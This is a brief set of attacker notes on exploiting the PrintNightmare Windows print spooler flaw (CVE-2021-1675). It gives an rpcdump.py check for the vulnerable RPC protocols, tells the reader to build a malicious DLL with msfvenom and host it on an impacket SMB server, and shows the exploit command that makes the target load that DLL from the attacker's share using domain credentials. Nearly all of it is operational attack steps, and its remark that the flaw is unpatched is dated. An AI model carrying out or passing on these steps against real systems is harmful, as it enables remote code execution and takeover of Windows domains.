## PrintNightmare CVE-2021-1675
```
https://github.com/cube0x0/CVE-2021-1675
This cve works because of the spooler service running in windows and currently it is not patched and only mitigation is to disable spooler service so we need this service running in order to exploit

First we see if spooler service is running or not

    Run following command in attacker machine and see if we get similiar results as shown

rpcdump.py @TargetIp| egrep 'MS-RPRN|MS-PAR'

Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol Protocol: [MS-RPRN]: Print System Remote Protocol

    Now we need a malicuius dll containing our code and a smb server running to host it

    we create a dll from msffvenom or any other way and run impacket smb server to host it

    Now we simply run the exploit remotely as shown in the github

    ./CVE-2021-1675.py domain.name/domain_user:passsword@TargetIP '\OurIPAddress\smb\file.dll'
```
